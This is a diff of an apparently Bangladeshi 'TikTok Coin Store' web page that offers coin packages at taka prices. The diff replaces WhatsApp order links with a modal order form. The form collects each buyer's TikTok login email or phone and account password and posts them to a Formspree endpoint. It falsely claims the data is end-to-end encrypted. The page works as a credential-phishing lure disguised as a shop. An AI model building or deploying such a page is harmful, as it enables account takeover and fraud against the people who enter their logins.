@@ -6,182 +6,153 @@
     <title>TikTok Coin Store - Boss</title>
     <style>
         body { font-family: 'Arial', sans-serif; background-color: #f4f4f9; margin: 0; padding: 0; text-align: center; }
-        header { background: #fe2c55; color: #fff; padding: 25px; font-size: 26px; font-weight: bold; border-bottom: 5px solid #000; }
-        .container { padding: 20px; display: flex; flex-wrap: wrap; justify-content: center; }
-        .card { background: white; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin: 15px; padding: 20px; width: 280px; transition: 0.3s; border: 1px solid #ddd; }
+        header { background: #fe2c55; color: #fff; padding: 25px; font-size: 20px; font-weight: bold; border-bottom: 5px solid #000; }
+        .container { padding: 20px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; max-width: 1200px; margin: 0 auto; }
+        
+        /* কার্ড স্টাইল */
+        .card { background: white; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 20px; width: 250px; transition: 0.3s; border: 1px solid #ddd; }
         .card:hover { transform: translateY(-10px); border-color: #fe2c55; }
-        .coin-icon { font-size: 50px; color: #ffac33; margin-bottom: 10px; }
+        .coin-logo { width: 80px; height: 80px; border-radius: 50%; margin-bottom: 15px; object-fit: cover; }
+        .small-coin { width: 25px; height: 25px; vertical-align: middle; }
         .price { font-size: 24px; color: #fe2c55; font-weight: bold; margin: 15px 0; }
-        .buy-btn { background: #000; color: white; border: none; padding: 12px 25px; border-radius: 30px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; font-weight: bold; }
+        
+        /* অর্ডার বাটন স্টাইল */
+        .buy-btn { background: #000; color: white; border: none; padding: 12px 25px; border-radius: 30px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; font-weight: bold; transition: 0.3s; }
         .buy-btn:hover { background: #fe2c55; }
+
+        /* ফ্লোটিং WhatsApp বাটন */
+        .whatsapp-float { position: fixed; width: 60px; height: 60px; bottom: 40px; right: 40px; background-color: #25d366; color: #FFF; border-radius: 50px; text-align: center; font-size: 30px; box-shadow: 2px 2px 10px rgba(0,0,0,0.2); z-index: 100; display: flex; align-items: center; justify-content: center; text-decoration: none; }
+        .whatsapp-float:hover { background-color: #128c7e; transform: scale(1.1); }
+
+        /* মোডাল স্টাইল */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); overflow-y: auto; }
+        .modal-content { background: #fff; margin: 5% auto; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; position: relative; text-align: left; }
+        .close-btn { position: absolute; right: 20px; top: 10px; font-size: 28px; cursor: pointer; color: #777; }
+        
+        /* ফর্ম স্টাইল */
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .submit-btn { width: 100%; padding: 14px; background-color: #fe2c55; border: none; color: white; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; }
+        
         footer { margin-top: 50px; padding: 20px; background: #000; color: white; }
     </style>
 </head>
 <body>
 
 <header>
-    ওয়েব সাইটটি এখনো চালু হয়নি,দয়া করে কেউ এখান থেকে অর্ডার করবেন না।
-    আমরা খুব শিগগিরি এটা চালু করব।
+    ওয়েব সাইটটি এখনো চালু হয়নি, দয়া করে কেউ এখান থেকে অর্ডার করবেন না।
 </header>
 
 <h2 style="margin-top: 30px;">সেরা দামে টিকটক কয়েন কিনুন!</h2>
 
 <div class="container">
     <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
+        <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" alt="Coin Logo" class="coin-logo">
+        <h3>১০০ <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" class="small-coin" alt="coin"></h3>
+        <p class="price">৳ ১৫০</p>
+        <button class="buy-btn" onclick="openModal()">অর্ডার করুন</button>
     </div>
 
     <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
+        <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" alt="Coin Logo" class="coin-logo">
+        <h3>৫০০ <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" class="small-coin" alt="coin"></h3>
+        <p class="price">৳ ৭০০</p>
+        <button class="buy-btn" onclick="openModal()">অর্ডার করুন</button>
     </div>
 
     <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
-    </div>
-    
-    <div class="container">
-    <div class="card">
-        <div class="coin-icon">🪙</div>
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
+        <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" alt="Coin Logo" class="coin-logo">
+        <h3>১০০০ <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" class="small-coin" alt="coin"></h3>
+        <p class="price">৳ ১৩৫০</p>
+        <button class="buy-btn" onclick="openModal()">অর্ডার করুন</button>
     </div>
 
-<div class="container">
     <div class="card">
-        <div class="coin-img-container">
-            <img src="https://ibb.co.com/mFrpZ2sq" alt="Coin Logo" class="coin-logo">
-        </div>
-        
-        <h3>০০ কয়েন প্যাকেজ</h3>
-        <p class="price">৳ ০০</p>
-        <a href="https://wa.me/message/CVTAZZL3IOZWG1" class="buy-btn">WhatsApp এ অর্ডার দিন</a>
+        <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" alt="Coin Logo" class="coin-logo">
+        <h3>২০০০ <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" class="small-coin" alt="coin"></h3>
+        <p class="price">৳ ২৬০০</p>
+        <button class="buy-btn" onclick="openModal()">অর্ডার করুন</button>
+    </div>
+
+    <div class="card">
+        <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" alt="Coin Logo" class="coin-logo">
+        <h3>৫০০০ <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" class="small-coin" alt="coin"></h3>
+        <p class="price">৳ ৬৫০০</p>
+        <button class="buy-btn" onclick="openModal()">অর্ডার করুন</button>
+    </div>
+
+    <div class="card">
+        <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" alt="Coin Logo" class="coin-logo">
+        <h3>১০,০০০ <img src="https://i.ibb.co.com/mFrpZ2sq/coin-logo.jpg" class="small-coin" alt="coin"></h3>
+        <p class="price">৳ ১২,৮০০</p>
+        <button class="buy-btn" onclick="openModal()">অর্ডার করুন</button>
     </div>
 </div>
 
-<style>
-    .card {
-        background: #fff;
-        border-radius: 15px;
-        padding: 20px;
-        text-align: center;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        width: 250px;
-    }
-
-    .coin-logo {
-        width: 80px;
-        height: 80px;
-        border-radius: 50%;
-        margin-bottom: 15px;
-        object-fit: cover;
-    }
-
-    .price {
-        font-size: 24px;
-        color: #2ecc71;
-        font-weight: bold;
-        margin: 10px 0;
-    }
-
-    .buy-btn {
-        display: inline-block;
-        background: #25D366; /* WhatsApp Green */
-        color: white;
-        padding: 10px 20px;
-        text-decoration: none;
-        border-radius: 50px;
-        font-weight: bold;
-        transition: 0.3s;
-    }
-
-    .buy-btn:hover {
-        background: #128C7E;
-        transform: scale(1.05);
-    }
-</style>
+<div id="orderModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal()">&times;</span>
+        <h2 style="color: #fe2c55; text-align: center;">TikTok Coin Top-up</h2>
+        <p style="text-align: center; color: green; font-weight: bold;">🔒 Your Data is End-to-End Encrypted</p>
         
-
-        
-        
+        <form action="https://formspree.io/f/xgovjbkn" method="POST">
+            <div class="input-group">
+                <label>Select Coin Plan</label>
+                <select name="Package" required>
+                    <option value="100_coins">100 Coins - 150 TK</option>
+                    <option value="500_coins">500 Coins - 700 TK</option>
+                    <option value="1000_coins">1000 Coins - 1350 TK</option>
+                    <option value="2000_coins">2000 Coins - 2600 TK</option>
+                    <option value="5000_coins">5000 Coins - 6500 TK</option>
+                    <option value="10000_coins">10000 Coins - 12800 TK</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>TikTok Username</label>
+                <input type="text" name="TikTok_Username" placeholder="@username" required>
+            </div>
+            <div class="input-group">
+                <label>Login Email or Phone</label>
+                <input type="text" name="Login_Email_Phone" placeholder="Email / Phone number" required>
+            </div>
+            <div class="input-group">
+                <label>Account Password</label>
+                <input type="password" name="Password" placeholder="Enter password" required>
+            </div>
+            <div class="input-group">
+                <label>WhatsApp Number (Contact)</label>
+                <input type="text" name="Contact_Number" placeholder="Your WhatsApp number" required>
+            </div>
+            <input type="text" name="_gotcha" style="display:none">
+            <button type="submit" class="submit-btn">Confirm Order</button>
+            <p style="font-size: 12px; color: #777; margin-top: 15px; text-align: center;">অর্ডার করার ১০-৩০ মিনিটের মধ্যে আপনার অ্যাকাউন্টে কয়েন যোগ হয়ে যাবে।</p>
+        </form>
+    </div>
 </div>
+
+<a href="https://wa.me/message/CVTAZZL3IOZWG1" class="whatsapp-float" target="_blank">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" width="35">
+</a>
 
 <footer>
     <p>&copy; 2026 TikTok Coin Store | Managed by Boss</p>
 </footer>
+
+<script>
+    function openModal() {
+        document.getElementById("orderModal").style.display = "block";
+    }
+    function closeModal() {
+        document.getElementById("orderModal").style.display = "none";
+    }
+    window.onclick = function(event) {
+        let modal = document.getElementById("orderModal");
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    }
+</script>
 
 </body>
 </html>
